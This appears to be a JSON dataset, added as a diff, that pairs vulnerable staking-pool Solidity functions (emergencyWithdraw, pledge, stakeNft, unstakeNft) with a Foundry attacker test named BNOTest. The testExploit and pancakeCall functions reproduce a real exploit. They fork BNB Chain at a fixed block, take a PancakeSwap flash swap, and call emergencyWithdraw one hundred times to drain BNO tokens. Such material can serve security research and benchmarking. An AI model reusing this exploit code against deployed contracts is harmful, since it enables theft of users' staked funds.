@@ -1,0 +1,135 @@
+[
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "emergencyWithdraw",
+    "original_code": "    function emergencyWithdraw() public {\n\n        pledgeAddress.safeTransfer(address(msg.sender), userInfo[msg.sender].allstake);\n        userInfo[msg.sender].allstake = 0;\n        userInfo[msg.sender].rewardDebt = 0;\n    }\n    \n\t\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "pledge",
+    "original_code": "    function pledge(uint256 _stakeAmount) public  notPause payable{\n\t\tif(block.timestamp < startTime){\n\t\t\trequire(whitelist[msg.sender],\"Not yet started\");\n\t\t}\n\t\trequire(msg.value >= withdrawalFee,\"Please pay the withdrawal fee\");\n        uint256 pending = pendingFit(msg.sender);\n        if(pending > 0){            \n            payable(wallet).transfer(msg.value);        \n            safeGoodTransfer(msg.sender,pending);\n            emit Withdraw(msg.sender, pending);\n        }else{\n\t\t\tpayable(wallet).transfer(msg.value); \n\t\t}\n\t\t \n        if( userInfo[msg.sender].nftAmount == 0){\n\t\t\tuint256 fee = _stakeAmount.mul(rePledgeRate).div(100);\n\t\t\tpledgeAddress.transferFrom(msg.sender,rateAddress, fee);\n\t\t\t_stakeAmount = _stakeAmount.sub(fee);\n\t\t}\n\t\t\n        pledgeAddress.transferFrom(msg.sender,address(this),_stakeAmount);\n        userInfo[msg.sender].allstake= userInfo[msg.sender].allstake.add(_stakeAmount);\n\t\tpoolInfo.stakeSupply = poolInfo.stakeSupply.add(_stakeAmount);\n        \n        updatePool();\n        userInfo[msg.sender].rewardDebt = (userInfo[msg.sender].allstake.add(userInfo[msg.sender].nftAddition)).mul(poolInfo.accPerShare).div(1e12);\n\n        \n        emit Pledge(msg.sender, _stakeAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "stakeNft",
+    "original_code": "\t function stakeNft(uint[] memory tokenIds) public notPause payable{\n\t\trequire(msg.value >= withdrawalFee,\"Please pay the withdrawal fee\");\n        uint256 pending = pendingFit(msg.sender);\n        if(pending > 0){           \n            payable(wallet).transfer(msg.value);        \n            safeGoodTransfer(msg.sender,pending);\n            emit Withdraw(msg.sender, pending);\n        }else{\n\t\t\tpayable(wallet).transfer(msg.value); \n\t\t}\n\n        require(tokenIds.length > 0, \"At least one token ID must be provided\");\n        for (uint i = 0; i < tokenIds.length; i++) {\n\t\t\trequire(nftContract.isOfficialNFT(tokenIds[i]),\"Not OfficialNFT\");\n            require(nftContract.ownerOf(tokenIds[i]) == msg.sender, \"You don't own this NFT\");\n            userInfo[msg.sender].nftAmount += 1; \n            nftContract.safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n\t\t\t\n\t\t\t(bool isIn,uint256 index) = firstIndexOf(userNft[msg.sender],0);\n\t\t\tif(!isIn){\n\t\t\t\tuserNft[msg.sender].push(tokenIds[i]);        \n\t\t\t}else{\n\t\t\t\tuserNft[msg.sender][index] = tokenIds[i];\n\t\t\t}\n            \n            poolInfo.nftSupply = poolInfo.nftSupply.add(1);\n            emit StakeNft(msg.sender,tokenIds[i]);\n        }\n        require(userInfo[msg.sender].nftAmount <= poolInfo.maxNftAmount,\"Too many NFTs\");\n        updatePool();\n        userInfo[msg.sender].rewardDebt = (userInfo[msg.sender].allstake.add(userInfo[msg.sender].nftAddition)).mul(poolInfo.accPerShare).div(1e12);   \n        \n\n    }\n    \n    function unstakeNft(uint[] memory tokenIds) public payable notPause{\n\t\trequire(msg.value >= withdrawalFee,\"Please pay the withdrawal fee\");\n        uint256 pending = pendingFit(msg.sender);\n        if(pending > 0){           \n            payable(wallet).transfer(msg.value);        \n            safeGoodTransfer(msg.sender,pending);\n            emit Withdraw(msg.sender, pending);\n        }else{\n\t\t\tpayable(wallet).transfer(msg.value); \n\t\t}\n\t\t\n\n        require(tokenIds.length > 0, \"At least one token ID must be provided\");\n        for (uint i = 0; i < tokenIds.length; i++) {\n            require(nftContract.ownerOf(tokenIds[i]) == address(this), \"There is no such NFT on the contract\");\n\t\t\t\n\t\t\t(bool isIn, uint256 index) = firstIndexOf(userNft[msg.sender],tokenIds[i]);\n\t\t\t\trequire(isIn,\"This is not your NFT\");\n\t\t\t\tremoveByIndex(msg.sender, index);\n\t\t\t\tuserInfo[msg.sender].nftAmount = userInfo[msg.sender].nftAmount.sub(1);\n\t\t\t\tnftContract.safeTransferFrom(address(this), msg.sender, tokenIds[i]);   \n\n                poolInfo.nftSupply = poolInfo.nftSupply.sub(1);\n                emit UnStakeNft(msg.sender,tokenIds[i]);         \n        }\n       \n        updatePool();\n        userInfo[msg.sender].rewardDebt = (userInfo[msg.sender].allstake.add(userInfo[msg.sender].nftAddition)).mul(poolInfo.accPerShare).div(1e12);   \n\n       \n    }\n\t\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPool",
+    "source_type": "victim_contract",
+    "function_name": "unstakeNft",
+    "original_code": "    function unstakeNft(uint[] memory tokenIds) public payable notPause{\n\t\trequire(msg.value >= withdrawalFee,\"Please pay the withdrawal fee\");\n        uint256 pending = pendingFit(msg.sender);\n        if(pending > 0){           \n            payable(wallet).transfer(msg.value);        \n            safeGoodTransfer(msg.sender,pending);\n            emit Withdraw(msg.sender, pending);\n        }else{\n\t\t\tpayable(wallet).transfer(msg.value); \n\t\t}\n\t\t\n\n        require(tokenIds.length > 0, \"At least one token ID must be provided\");\n        for (uint i = 0; i < tokenIds.length; i++) {\n            require(nftContract.ownerOf(tokenIds[i]) == address(this), \"There is no such NFT on the contract\");\n\t\t\t\n\t\t\t(bool isIn, uint256 index) = firstIndexOf(userNft[msg.sender],tokenIds[i]);\n\t\t\t\trequire(isIn,\"This is not your NFT\");\n\t\t\t\tremoveByIndex(msg.sender, index);\n\t\t\t\tuserInfo[msg.sender].nftAmount = userInfo[msg.sender].nftAmount.sub(1);\n\t\t\t\tnftContract.safeTransferFrom(address(this), msg.sender, tokenIds[i]);   \n\n                poolInfo.nftSupply = poolInfo.nftSupply.sub(1);\n                emit UnStakeNft(msg.sender,tokenIds[i]);         \n        }\n       \n        updatePool();\n        userInfo[msg.sender].rewardDebt = (userInfo[msg.sender].allstake.add(userInfo[msg.sender].nftAddition)).mul(poolInfo.accPerShare).div(1e12);   \n\n       \n    }\n\t\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "onERC721Received",
+    "original_code": "    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        BNO.approve(address(Pool), type(uint256).max);\n        for (uint256 i; i < 100; i++) {\n            callEmergencyWithdraw();\n        }\n        BNO.transfer(address(PancakePair), 296_077 * 1e18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 30_056_629);\n        cheats.label(address(NFT), \"NFT\");\n        cheats.label(address(BNO), \"BNO\");\n        cheats.label(address(PancakePair), \"PancakePair\");\n        cheats.label(address(Pool), \"Pool\");\n        cheats.label(attacker, \"Attacker\");\n        cheats.label(attackerContract, \"Attacker Contract\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BNOTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        cheats.startPrank(attackerContract);\n        NFT.transferFrom(attacker, address(this), 13);\n        NFT.transferFrom(attacker, address(this), 14);\n        cheats.stopPrank();\n\n        emit log_named_decimal_uint(\n            \"Attacker balance of BNO before exploit\", BNO.balanceOf(address(this)), BNO.decimals()\n        );\n        PancakePair.swap(0, BNO.balanceOf(address(PancakePair)) - 1, address(this), hex\"00\");\n        emit log_named_decimal_uint(\n            \"Attacker balance of BNO after exploit\", BNO.balanceOf(address(this)), BNO.decimals()\n        );\n    }\n\n",
+    "description": ""
+  }
+]
